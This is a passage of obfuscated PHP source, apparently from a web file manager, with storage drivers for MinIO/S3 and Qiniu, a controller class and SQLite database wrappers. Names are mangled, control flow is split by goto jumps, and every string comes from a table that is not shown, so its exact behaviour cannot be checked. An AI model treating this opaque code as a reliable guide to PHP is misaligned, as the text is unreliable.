$this->cacheMethod($_SERVER[çâ¥×ø³][166], $é”Æä·’); } protected function objectMeta($Ãµ‹¢¨) { return $this->cacheMethod($_SERVER[çâ¥×ø³][168], $Ãµ‹¢¨); } protected function _objectMeta($§¢²õáã) { $Ì£”ˆ®Ì =& $_SERVER[çâ¥×ø³]; $§¢²õáã = rtrim($§¢²õáã, $Ì£”ˆ®Ì[8]); try { $Ÿïœ°µ = $this->client->getObjectInfo($this->bucket, $§¢²õáã); if (!isset($Ÿïœ°µ[$Ì£”ˆ®Ì[236]]) && isset($Ÿïœ°µ[$Ì£”ˆ®Ì[252]])) { $Ÿïœ°µ[$Ì£”ˆ®Ì[236]] = $Ÿïœ°µ[$Ì£”ˆ®Ì[252]]; } } catch (Exception $Èîõº‘’) { $Ÿïœ°µ = !1; } if (!$Ÿïœ°µ) { } return $Ÿïœ°µ; } protected function _isFolder($„Öİåá£) { $ÖûÎßıé =& $_SERVER[çâ¥×ø³]; $„Öİåá£ = rtrim($„Öİåá£, $ÖûÎßıé[8]); if ($„Öİåá£ == $ÖûÎßıé[12] || $„Öİåá£ == $ÖûÎßıé[8]) { return !0; } $¡èÈ¿Ëñ = $this->client->getBucket($this->bucket, $„Öİåá£, null, 1); if (empty($¡èÈ¿Ëñ[$ÖûÎßıé[220]])) { return !1; } $ğÙæÉ¨İ = $¡èÈ¿Ëñ[$ÖûÎßıé[220]][0][$ÖûÎßıé[32]]; return stripos($ğÙæÉ¨İ, $„Öİåá£ . $ÖûÎßıé[8]) === 0 ? !0 : !1; if (substr($ğÙæÉ¨İ, -1) == $ÖûÎßıé[8]) { return !0; } if (get_path_this($ğÙæÉ¨İ) == get_path_this($„Öİåá£)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ê´ÁÀ) { parent::__construct($Ê´ÁÀ); $this->signatureVersion($_SERVER[çâ¥×ø³][231]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($±ÚÈ›¬î, $âè±¡“ = 3600) { $ÈÒÂúöò =& $_SERVER[çâ¥×ø³]; $¢ñõš•ò = $ÈÒÂúöò[213]; $¸Éí‘Ï¢ = $ÈÒÂúöò[253]; $²ÕŒé½ = $ÈÒÂúöò[62]; $ê§ÈÉÏÍ = gmdate($ÈÒÂúöò[254]); $ˆ­ç£ = gmdate($ÈÒÂúöò[255]); $éşØåŒ = $ÈÒÂúöò[256]; $È²…™Ö† = $âè±¡“ . $ÈÒÂúöò[12]; $íî¢»á’ = $ÈÒÂúöò[257]; $¾¿ÌÉƒô = array($this->accessKey, $ˆ­ç£, $this->region, $²ÕŒé½, $éşØåŒ); $‘´ä’¢ = implode($ÈÒÂúöò[8], $¾¿ÌÉƒô); $‰Ø©¥ıü = array($ÈÒÂúöò[258] => gmdate($ÈÒÂúöò[259], strtotime($ÈÒÂúöò[260])), $ÈÒÂúöò[261] => array(array($ÈÒÂúöò[262] => $this->bucket), array($ÈÒÂúöò[263] => $¢ñõš•ò), array($ÈÒÂúöò[264], $ÈÒÂúöò[265], $ÈÒÂúöò[12]), array($ÈÒÂúöò[264], $ÈÒÂúöò[266], $ÈÒÂúöò[12]), array($ÈÒÂúöò[264], $ÈÒÂúöò[267], $ÈÒÂúöò[12]), array($ÈÒÂúöò[268] => $íî¢»á’), array($ÈÒÂúöò[269] => $‘´ä’¢), array($ÈÒÂúöò[270] => $¸Éí‘Ï¢), array($ÈÒÂúöò[271] => $ê§ÈÉÏÍ), array($ÈÒÂúöò[272] => $È²…™Ö†))); $“€û¡ë‘ = base64_encode(json_encode($‰Ø©¥ıü)); $ÄÂøÀó© = hash_hmac($ÈÒÂúöò[273], $ˆ­ç£, $ÈÒÂúöò[274] . $this->secret, !0); $ö±Ó³ĞÔ = hash_hmac($ÈÒÂúöò[273], $this->region, $ÄÂøÀó©, !0); $îí«©Üà = hash_hmac($ÈÒÂúöò[273], $²ÕŒé½, $ö±Ó³ĞÔ, !0); $Ï†Æ¾í¬ = hash_hmac($ÈÒÂúöò[273], $éşØåŒ, $îí«©Üà, !0); $®É¯íæ = hash_hmac($ÈÒÂúöò[273], $“€û¡ë‘, $Ï†Æ¾í¬); $ÏÓŸÀÎœ = array($ÈÒÂúöò[230] => $ÈÒÂúöò[12], $ÈÒÂúöò[275] => $ÈÒÂúöò[12], $ÈÒÂúöò[263] => $¢ñõš•ò, $ÈÒÂúöò[268] => $íî¢»á’, $ÈÒÂúöò[276] => $“€û¡ë‘, $ÈÒÂúöò[277] => $‘´ä’¢, $ÈÒÂúöò[278] => $¸Éí‘Ï¢, $ÈÒÂúöò[279] => $ê§ÈÉÏÍ, $ÈÒÂúöò[280] => $È²…™Ö†, $ÈÒÂúöò[281] => $®É¯íæ, $ÈÒÂúöò[196] => $this->getHost()); return $ÏÓŸÀÎœ; } } goto EÜ…­ùîÛé; FÜ¸Ä¤›¿í: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $˜ÊôÊ›ü =& $_SERVER[çâ¥×ø³]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$˜ÊôÊ›ü[6]] =& $config; $this->values[$˜ÊôÊ›ü[7]] =& $in; $this->tpl = TEMPLATE . MOD . $˜ÊôÊ›ü[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÍÒ™ƒ´ã) { if (1 === func_num_args()) { $this->{$ÍÒ™ƒ´ã} = new $ÍÒ™ƒ´ã(); } else { $Æà“ùĞ· = new ReflectionClass($ÍÒ™ƒ´ã); $áÏæÜ¥ = func_get_args(); array_shift($áÏæÜ¥); $this->{$ÍÒ™ƒ´ã} = $Æà“ùĞ·->newInstanceArgs($áÏæÜ¥); } return $this->{$ÍÒ™ƒ´ã}; } public function routeBind($´÷€Ñ‘®, $ÌˆÒ¿»Ç, $óæÍèĞÑ = 3) { $ıòÄ½ =& $_SERVER[çâ¥×ø³]; $ Œ°ù¤ = $this->in[$ıòÄ½[9]]; $´÷€Ñ‘® = str_replace($ıòÄ½[10], $ıòÄ½[11], trim(trim($´÷€Ñ‘®, $ıòÄ½[8]), $ıòÄ½[12])); if (!$´÷€Ñ‘® || count($ Œ°ù¤) <= $óæÍèĞÑ) { return !1; } $üî®÷Î™ = !0; $†ÅÒ³´¼ = explode($ıòÄ½[8], $´÷€Ñ‘®); for ($Âàæ£‰ú = 0; $Âàæ£‰ú < count($†ÅÒ³´¼); $Âàæ£‰ú++) { if ($†ÅÒ³´¼[$Âàæ£‰ú] != $ Œ°ù¤[$óæÍèĞÑ + $Âàæ£‰ú]) { $üî®÷Î™ = !1; break; } } if (!$üî®÷Î™) { return; } call_user_func_array(array($this, $ÌˆÒ¿»Ç), array()); } public function routeArgs($ô«÷¿Ê† = 3) { $°üÜ¸ = $this->in[$_SERVER[çâ¥×ø³][9]]; if (count($°üÜ¸) <= $ô«÷¿Ê†) { return array(); } $ÙæÈ§¹ = array(); for ($¯…¼ìì = $ô«÷¿Ê†; $¯…¼ìì < count($°üÜ¸); $¯…¼ìì += 2) { $ÙæÈ§¹[$°üÜ¸[$¯…¼ìì]] = $°üÜ¸[$¯…¼ìì + 1]; $this->in[$°üÜ¸[$¯…¼ìì]] = $°üÜ¸[$¯…¼ìì + 1]; } return $ÙæÈ§¹; } protected function assign($«´êôåÍ, $é»Ù¯¡) { $this->values[$«´êôåÍ] = $é»Ù¯¡; } protected function display($‰é™èºï) { ob_end_clean(); extract($this->values); require $this->tpl . $‰é™èºï; } } class DbSqliteBase extends Db { public function __construct($õŠäé®Ï = '') { $ûú„ÈÏà =& $_SERVER[çâ¥×ø³]; if (!extension_loaded($ûú„ÈÏà[13])) { think_exception(think_lang($ûú„ÈÏà[14]) . $ûú„ÈÏà[15]); } if (!empty($õŠäé®Ï)) { if (!isset($õŠäé®Ï[$ûú„ÈÏà[16]])) { $õŠäé®Ï[$ûú„ÈÏà[16]] = 438; } $this->config = $õŠäé®Ï; if (empty($this->config[$ûú„ÈÏà[17]])) { $this->config[$ûú„ÈÏà[17]] = array(); } } } public function connect($§·œø¶¤ = '', $±çÓ¸Á¯ = 0) { $ªÔ„Òã =& $_SERVER[çâ¥×ø³]; if (!isset($this->linkID[$±çÓ¸Á¯])) { if (empty($§·œø¶¤)) { $§·œø¶¤ = $this->config; } $­»Ô÷è‚ = !empty($§·œø¶¤[$ªÔ„Òã[17]][$ªÔ„Òã[18]]) ? $§·œø¶¤[$ªÔ„Òã[17]][$ªÔ„Òã[18]] : $this->pconnect; $¾õİ­ê¿ = $­»Ô÷è‚ ? $ªÔ„Òã[19] : $ªÔ„Òã[20]; $this->linkID[$±çÓ¸Á¯] = $¾õİ­ê¿($§·œø¶¤[$ªÔ„Òã[21]], $§·œø¶¤[$ªÔ„Òã[16]]); if (!$this->linkID[$±çÓ¸Á¯]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$±çÓ¸Á¯], 30000); if (1 != think_config($ªÔ„Òã[22])) { unset($this->config); } } return $this->linkID[$±çÓ¸Á¯]; } public function free() { $this->queryID = null; } public function query($ù¯ïÕ ½) { $ùŞğ¬Í =& $_SERVER[çâ¥×ø³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ù¯ïÕ ½; if ($this->queryID) { $this->free(); } think_action_status($ùŞğ¬Í[23], 1); think_status($ùŞğ¬Í[24]); $this->queryID = sqlite_query($this->_linkID, $ù¯ïÕ ½); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ô®÷ü¾¹ = $this->getAll(); return $Ô®÷ü¾¹; } } public function execute($õÕê¸…) { $¹£ŸÇ—ş =& $_SERVER[çâ¥×ø³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $õÕê¸…; if ($this->queryID) { $this->free(); } think_action_status($¹£ŸÇ—ş[25], 1); think_status($¹£ŸÇ—ş[24]); $«â†üÙÏ = sqlite_exec($this->_linkID, $õÕê¸…); $this->debug(); if (!1 === $«â†üÙÏ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[çâ¥×ø³][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ñâ¸ßÒù = sqlite_query($this->_linkID, $_SERVER[çâ¥×ø³][27]); if (!$Ñâ¸ßÒù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ô¸¹˜Ê = sqlite_query($this->_linkID, $_SERVER[çâ¥×ø³][28]); if (!$ô¸¹˜Ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ õÃıªê = array(); if ($this->numRows > 0) { for ($ÌóÁŞêí = 0; $ÌóÁŞêí < $this->numRows; $ÌóÁŞêí++) { $ õÃıªê[$ÌóÁŞêí] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ õÃıªê; } public function getFields($í†·ŸÈì) { $’ ´ƒÑÏ =& $_SERVER[çâ¥×ø³]; $ş¨ÑÔ•å = $this->query($’ ´ƒÑÏ[29] . $í†·ŸÈì . $’ ´ƒÑÏ[30]); $ìÌ¹‰¿Š = array(); if ($ş¨ÑÔ•å) { foreach ($ş¨ÑÔ•å as $–İ´ƒà => $—ÓÕ«­Ã) { $ìÌ¹‰¿Š[$—ÓÕ«­Ã[$’ ´ƒÑÏ[31]]] = array($’ ´ƒÑÏ[32] => $—ÓÕ«­Ã[$’ ´ƒÑÏ[31]], $’ ´ƒÑÏ[33] => $—ÓÕ«­Ã[$’ ´ƒÑÏ[34]], $’ ´ƒÑÏ[35] => (bool) ($—ÓÕ«­Ã[$’ ´ƒÑÏ[36]] === $’ ´ƒÑÏ[12]), $’ ´ƒÑÏ[37] => $—ÓÕ«­Ã[$’ ´ƒÑÏ[38]], $’ ´ƒÑÏ[39] => strtolower($—ÓÕ«­Ã[$’ ´ƒÑÏ[40]]) == $’ ´ƒÑÏ[41], $’ ´ƒÑÏ[42] => strtolower($—ÓÕ«­Ã[$’ ´ƒÑÏ[43]]) == $’ ´ƒÑÏ[44]); } } return $ìÌ¹‰¿Š; } public function getTables($ï¥íÃ× = '') { $§…ò±€€ =& $_SERVER[çâ¥×ø³]; $Ù­¯ğ¿À = $this->query($§…ò±€€[45] . $§…ò±€€[46] . $§…ò±€€[47]); $¼€É±—¡ = array(); foreach ($Ù­¯ğ¿À as $›ÒÕİÆ„ => $÷µ¿ïÄ£) { $¼€É±—¡[$›ÒÕİÆ„] = current($÷µ¿ïÄ£); } return $¼€É±—¡; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $˜Ü–ü¼Å =& $_SERVER[çâ¥×ø³]; $÷§ÈÅêñ = sqlite_last_error($this->_linkID); $this->error = $÷§ÈÅêñ . $˜Ü–ü¼Å[4] . sqlite_error_string($÷§ÈÅêñ); if ($˜Ü–ü¼Å[12] != $this->queryStr) { $this->error .= LNG($˜Ü–ü¼Å[48]) . $this->queryStr; } think_trace($this->error, $˜Ü–ü¼Å[12], $˜Ü–ü¼Å[49]); return $this->error; } public function escapeString($ —ã‘Â·) { return sqlite_escape_string($ —ã‘Â·); } public function parseLimit($À‚Ø³™¬) { $óœ‡¹¢› =& $_SERVER[çâ¥×ø³]; $œŞ‡Áêù = $óœ‡¹¢›[12]; if (!empty($À‚Ø³™¬)) { $À‚Ø³™¬ = explode($óœ‡¹¢›[50], $À‚Ø³™¬); if (count($À‚Ø³™¬) > 1) { $œŞ‡Áêù .= $óœ‡¹¢›[51] . $À‚Ø³™¬[1] . $óœ‡¹¢›[52] . $À‚Ø³™¬[0] . $óœ‡¹¢›[53]; } else { $œŞ‡Áêù .= $óœ‡¹¢›[51] . $À‚Ø³™¬[0] . $óœ‡¹¢›[53]; } } return $œŞ‡Áêù; } } class DbSqlite3Base extends Db { public function __construct($“¸¯’È¹ = '') { $ùÆ¬ãÌİ =& $_SERVER[çâ¥×ø³]; if (!class_exists($ùÆ¬ãÌİ[54])) { think_exception(think_lang($ùÆ¬ãÌİ[14]) . $ùÆ¬ãÌİ[55]); } if (!empty($“¸¯’È¹)) { if (!isset($“¸¯’È¹[$ùÆ¬ãÌİ[16]])) { $“¸¯’È¹[$ùÆ¬ãÌİ[16]] = 438; } $this->config = $“¸¯’È¹; if (empty($this->config[$ùÆ¬ãÌİ[17]])) { $this->config[$ùÆ¬ãÌİ[17]] = array(); } } } public function connect($½Î…Ìåà = '', $€´¹º’Ä = 0) { $™Îö©îë =& $_SERVER[çâ¥×ø³]; if (!isset($this->linkID[$€´¹º’Ä])) { if (empty($½Î…Ìåà)) { $½Î…Ìåà = $this->config; } $this->linkID[$€´¹º’Ä] = new SQLite3($½Î…Ìåà[$™Îö©îë[21]]); if (!$this->linkID[$€´¹º’Ä]) { think_exception($this->linkID[$€´¹º’Ä]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$€´¹º’Ä]->busyTimeout(30000); if (1 != think_config($™Îö©îë[22])) { unset($this->config); } } return $this->linkID[$€´¹º’Ä]; } public function free() { $this->queryID = null; } public function query($İ¯úß¨á) { $˜¥Ïğ²ò =& $_SERVER[çâ¥×ø³]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $İ¯úß¨á; if ($this->queryID) { $this->free(); } think_action_status($˜¥Ïğ²ò[23], 1); think_status($˜¥Ïğ²ò[24]); $this->queryID = $this->_linkID->query($İ¯úß¨á); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $˜ÉüÖò÷ = $this->getAll(); $this->numRows = count($˜ÉüÖò÷); return $˜ÉüÖò÷; } } public function execute($åŠ‘ñé) { $Ç÷š¬¨ô =& $_SERVER[çâ¥×ø³]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $åŠ‘ñé; if ($this->queryID) { $this->free(); } think_action_status($Ç÷š¬¨ô[25], 1); think_status($Ç÷š¬¨ô[24]); $ã§Ê‰‚Ÿ = $this->_linkID->exec($åŠ‘ñé); $this->debug(); if (!1 === $ã§Ê‰‚Ÿ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[çâ¥×ø³][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ ©ï–÷ = $this->_linkID->query($_SERVER[çâ¥×ø³][27]); if (!$ ©ï–÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $‰Ç¹ÔÆ¡ = $this->_linkID->query($_SERVER[çâ¥×ø³][28]); if (!$‰Ç¹ÔÆ¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¸÷…ÎŸñ = array(); while ($ÌÁ¬…’“ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¸÷…ÎŸñ[] = $ÌÁ¬…’“; } $this->queryID->reset(); return $¸÷…ÎŸñ; } public function getFields($½‰ÄßÕ«) { $ÁèÎù«ö =& $_SERVER[çâ¥×ø³]; $—ó†¨ø = $this->query($ÁèÎù«ö[29] . $½‰ÄßÕ« . $ÁèÎù«ö[30]); $­€¾™ = array(); if ($—ó†¨ø) { foreach ($—ó†¨ø as $ÒÜ´âáı => $‘¨İÏõ¿) { $­€¾™[$‘¨İÏõ¿[$ÁèÎù«ö[32]]] = array($ÁèÎù«ö[32] => $‘¨İÏõ¿[$ÁèÎù«ö[32]], $ÁèÎù«ö[33] => $‘¨İÏõ¿[$ÁèÎù«ö[33]], $ÁèÎù«ö[35] => (bool) ($‘¨İÏõ¿[$ÁèÎù«ö[35]] === $ÁèÎù«ö[12]), $ÁèÎù«ö[37] => $‘¨İÏõ¿[$ÁèÎù«ö[56]], $ÁèÎù«ö[39] => (bool) $‘¨İÏõ¿[$ÁèÎù«ö[57]], $ÁèÎù«ö[42] => (bool) $‘¨İÏõ¿[$ÁèÎù«ö[57]]); } } return $­€¾™; } public function getTables($Ë™“¯ = '') { $úÓ¯Ì¯À =& $_SERVER[çâ¥×ø³]; $±Ì¯†Ã½ = $this->query($úÓ¯Ì¯À[45] . $úÓ¯Ì¯À[46] . $úÓ¯Ì¯À[47]); $¨¢Ğ°ùß = array(); foreach ($±Ì¯†Ã½ as $è‰¬Ä› => $¨ĞÈÜ§²) { $¨¢Ğ°ùß[$è‰¬Ä›] = current($¨ĞÈÜ§²); } return $¨¢Ğ°ùß; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ò•„ =& $_SERVER[çâ¥×ø³]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ò•„[12] != $this->queryStr) { $this->error .= LNG($Ò•„[48]) . $this->queryStr; } think_trace($this->error, $Ò•„[12], $Ò•„[49]); return $this->error; } public function escapeString($óÅéç Î) { $ôş¯½ =& $_SERVER[çâ¥×ø³]; if ($this->_linkID) { return $this->_linkID->escapeString($óÅéç Î); } return str_ireplace($ôş¯½[58], $ôş¯½[59], $óÅéç Î); } public function parseLimit($Üë§ŞöÈ) { $Ş­¹şƒÇ =& $_SERVER[çâ¥×ø³]; $ØËòø¨ = $Ş­¹şƒÇ[12]; if (!empty($Üë§ŞöÈ)) { $Üë§ŞöÈ = explode($Ş­¹şƒÇ[50], $Üë§ŞöÈ); if (count($Üë§ŞöÈ) > 1) { $ØËòø¨ .= $Ş­¹şƒÇ[51] . $Üë§ŞöÈ[1] . $Ş­¹şƒÇ[52] . $Üë§ŞöÈ[0] . $Ş­¹şƒÇ[53]; } else { $ØËòø¨ .= $Ş­¹şƒÇ[51] . $Üë§ŞöÈ[0] . $Ş­¹şƒÇ[53]; } } return $ØËòø¨; } } goto bì‰“ï®²; DË¢ œĞË: define($_SERVER[çâ¥×ø³][285], 1); define($_SERVER[çâ¥×ø³][286], 0); define($_SERVER[çâ¥×ø³][287], 2); goto fÑ¼›…·†å; F¢’¦Ì§‘Ü: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($‰šÙş) { parent::__construct(); require_once SDK_DIR . $_SERVER[çâ¥×ø³][1463]; $this->_init($‰šÙş); } public function _init($¶¾œÍ±Ò) { $ã„¼ê ¾ =& $_SERVER[çâ¥×ø³]; $this->config = $¶¾œÍ±Ò; foreach ($¶¾œÍ±Ò as $ÖÆ¦Ùğ => $ìîÂàºà) { if (isset($this->{$ÖÆ¦Ùğ})) { $this->{$ÖÆ¦Ùğ} = $ìîÂàºà; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ã„¼ê ¾[1464] . LNG($ã„¼ê ¾[1422])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ùµ€û®, $”ÖÄ¾…É = '', $¥ÌÂõÏ = REPEAT_RENAME) { if ($this->setContent($Ùµ€û®, $”ÖÄ¾…É)) { return $this->getPathOuter($Ùµ€û®); } return !1; } public function mkdir($öÙî€’, $ €•üè› = REPEAT_SKIP) { $ÏŠŞæ£Ò =& $_SERVER[çâ¥×ø³]; $É¸¤¥£ = trim($öÙî€’, $ÏŠŞæ£Ò[8]); if ($this->_isFolder($É¸¤¥£)) { return $this->getPathOuter($É¸¤¥£); } $öÙî€’ = $É¸¤¥£ . $ÏŠŞæ£Ò[8]; $–›²ÛÜ = get_path_this($É¸¤¥£); $°ëş‡»¯ = $öÙî€’ . $–›²ÛÜ; if (!$this->mkfile($°ëş‡»¯)) { return !1; } if (!$this->moveFile($°ëş‡»¯, $öÙî€’)) { $this->delFile($°ëş‡»¯); return !1; } return $this->getPathOuter($É¸¤¥£); } public function copyFile($ÄÄ×ñÑ¤, $’¥ÀÏÌÂ) { $©â°óÌ¹ = $this->bucketManager->copy($this->bucket, $ÄÄ×ñÑ¤, $this->bucket, $’¥ÀÏÌÂ, !0); return $©â°óÌ¹ ? !1 : $this->getPathOuter($’¥ÀÏÌÂ); } public function moveFile($£áÂÇ„‰, $‰ú’ÍË´) { $Á÷éãü = $this->bucketManager->move($this->bucket, $£áÂÇ„‰, $this->bucket, $‰ú’ÍË´, !0); return $Á÷éãü ? !1 : $this->getPathOuter($‰ú’ÍË´); } public function delFile($«¶²œÄ) { if (!$this->exist($«¶²œÄ)) { return !0; } $„®€¢£É = $this->bucketManager->delete($this->bucket, $«¶²œÄ); return $„®€¢£É ? !1 : !0; } public function delFolder($ç‚‡ÀÍ¼) { $ Ùú¿Ã =& $_SERVER[çâ¥×ø³]; if (!$this->exist($ç‚‡ÀÍ¼)) { return !0; } $this->listItemCache = !1; $ÌşŸûª÷ = $this->fileList($ç‚‡ÀÍ¼); $this->listItemCache = !0; $Ê€›êíá = trim($ç‚‡ÀÍ¼, $ Ùú¿Ã[8]) . $ Ùú¿Ã[8]; if (!empty($ç‚‡ÀÍ¼) && $ç‚‡ÀÍ¼ !== $ Ùú¿Ã[212] && !in_array($Ê€›êíá, $ÌşŸûª÷[$ Ùú¿Ã[82]])) { $ÌşŸûª÷[$ Ùú¿Ã[82]][] = $Ê€›êíá; } $¬ÇŞÆŸ  = $this->delByBatch($ÌşŸûª÷[$ Ùú¿Ã[83]]); if (!$¬ÇŞÆŸ ) { return !1; } $¬ÇŞÆŸ  = $this->delByBatch($ÌşŸûª÷[$ Ùú¿Ã[82]]); if (!$¬ÇŞÆŸ ) { return !1; } return $this->delFile($Ê€›êíá); } private function delByBatch($à¶€êğğ) { foreach (array_chunk($à¶€êğğ, 1000) as $ïøë¿Ç™) { $Œôã¤¿‚ = $this->bucketManager->buildBatchDelete($this->bucket, $ïøë¿Ç™); list($•œ¤ËÍ§, $“ûÃœış) = $this->bucketManager->batch($Œôã¤¿‚); if ($“ûÃœış) { return !1; } } return !0; } public function rename($‘íŸÍ³ƒ, $©ÜÄÌ¸é) { return $this->renameObject($‘íŸÍ³ƒ, $©ÜÄÌ¸é); } public function fileInfo($Í¸×¡±, $¸Â¯öÎ = false, $Óî•“Éı = array()) { $ù›Ü¾ı¹ =& $_SERVER[çâ¥×ø³]; $‚êß ‚± = array($ù›Ü¾ı¹[32] => $this->pathThis($Í¸×¡±), $ù›Ü¾ı¹[84] => $this->getPathOuter($ù›Ü¾ı¹[8] . $Í¸×¡±), $ù›Ü¾ı¹[33] => $ù›Ü¾ı¹[214], $ù›Ü¾ı¹[76] => isset($Óî•“Éı[$ù›Ü¾ı¹[1465]]) ? $Óî•“Éı[$ù›Ü¾ı¹[1465]] : 0, $ù›Ü¾ı¹[175] => $this->ext($Í¸×¡±)); if ($¸Â¯öÎ) { return $‚êß ‚±; } $‚êß ‚±[$ù›Ü¾ı¹[215]] = $‚êß ‚±[$ù›Ü¾ı¹[85]] = 0; $‚êß ‚±[$ù›Ü¾ı¹[216]] = $‚êß ‚±[$ù›Ü¾ı¹[217]] = !0; if (empty($Óî•“Éı)) { $Óî•“Éı = $this->objectMeta($Í¸×¡±); if (!$Óî•“Éı) { return $‚êß ‚±; } } if (isset($Óî•“Éı[$ù›Ü¾ı¹[218]]) && $Óî•“Éı[$ù›Ü¾ı¹[218]]) { $‚êß ‚±[$ù›Ü¾ı¹[219]] = $Óî•“Éı[$ù›Ü¾ı¹[218]]; } if (isset($Óî•“Éı[$ù›Ü¾ı¹[228]]) && $Óî•“Éı[$ù›Ü¾ı¹[228]]) { $‚êß ‚±[$ù›Ü¾ı¹[219]] = $Óî•“Éı[$ù›Ü¾ı¹[228]]; } if (isset($Óî•“Éı[$ù›Ü¾ı¹[1466]])) { $‚êß ‚±[$ù›Ü¾ı¹[85]] = substr($Óî•“Éı[$ù›Ü¾ı¹[1466]] . $ù›Ü¾ı¹[12], 0, 10); } if (isset($Óî•“Éı[$ù›Ü¾ı¹[1465]])) { $‚êß ‚±[$ù›Ü¾ı¹[76]] = $Óî•“Éı[$ù›Ü¾ı¹[1465]]; } return $‚êß ‚±; } public function folderInfo($êğÚ ‡, $àäşş±æ = false) { $ËËí‘¼· =& $_SERVER[çâ¥×ø³]; $³÷–ßìœ = array($ËËí‘¼·[32] => $this->pathThis($êğÚ ‡), $ËËí‘¼·[84] => $this->getPathOuter($ËËí‘¼·[8] . $êğÚ ‡), $ËËí‘¼·[33] => $ËËí‘¼·[75]); if ($àäşş±æ) { return $³÷–ßìœ; } $³÷–ßìœ[$ËËí‘¼·[215]] = $³÷–ßìœ[$ËËí‘¼·[85]] = 0; $³÷–ßìœ[$ËËí‘¼·[216]] = $³÷–ßìœ[$ËËí‘¼·[217]] = !0; $êğÚ ‡ = rtrim($êğÚ ‡, $ËËí‘¼·[8]) . $ËËí‘¼·[8]; $·È“Œ‰ = $this->objectMeta($êğÚ ‡); if (isset($·È“Œ‰[$ËËí‘¼·[1466]])) { $³÷–ßìœ[$ËËí‘¼·[85]] = substr($·È“Œ‰[$ËËí‘¼·[1466]] . $ËËí‘¼·[12], 0, 10); } return $³÷–ßìœ; } public function listPath($°±¤­è¡, $¿¥óé¨ç = false) { $†äß‰š„ =& $_SERVER[çâ¥×ø³]; $¥ˆ•Ç÷ = $this->fileList($°±¤­è¡, $†äß‰š„[8], !0); foreach ($¥ˆ•Ç÷[$†äß‰š„[82]] as $š¾»¨‚´ => $’Š˜ÆĞ) { $¥ˆ•Ç÷[$†äß‰š„[82]][$š¾»¨‚´] = $this->folderInfo($’Š˜ÆĞ, $¿¥óé¨ç); } foreach ($¥ˆ•Ç÷[$†äß‰š„[83]] as $š¾»¨‚´ => $’Š˜ÆĞ) { $¥ˆ•Ç÷[$†äß‰š„[83]][$š¾»¨‚´] = $this->fileInfo($’Š˜ÆĞ[$†äß‰š„[94]], $¿¥óé¨ç, $’Š˜ÆĞ); } return $¥ˆ•Ç÷; } public function has($ÂÍ—­Ñ­, $Ë‡ä€İ’ = false, $Ìıª…× = true) { $ú±ØÕ°ç =& $_SERVER[çâ¥×ø³]; $ÂÍ—­Ñ­ = trim($ÂÍ—­Ñ­, $ú±ØÕ°ç[8]); $ƒëœîóî = empty($ÂÍ—­Ñ­) && $ÂÍ—­Ñ­ !== $ú±ØÕ°ç[212] ? $ú±ØÕ°ç[12] : $ÂÍ—­Ñ­ . $ú±ØÕ°ç[8]; $ıÊã‘¿é = $ú±ØÕ°ç[12]; $Û€‰Î»¡ = 500; $ªº©ºã¹ = $ú±ØÕ°ç[8]; $ßš¤ö¢‰ = $¯–© = 0; while (!0) { check_abort(); list($‘—€üı¼, $ÅìÜÜˆó) = $this->bucketManager->listFiles($this->bucket, $ƒëœîóî, $ıÊã‘¿é, $Û€‰Î»¡, $ªº©ºã¹); if ($ÅìÜÜˆó) { break; } $ıÊã‘¿é = array_key_exists($ú±ØÕ°ç[1434], $‘—€üı¼) ? $ıÊã‘¿é = $‘—€üı¼[$ú±ØÕ°ç[1467]] : $ú±ØÕ°ç[12]; if ($Ë‡ä€İ’) { if (!empty($‘—€üı¼[$ú±ØÕ°ç[1468]])) { $ßš¤ö¢‰ += 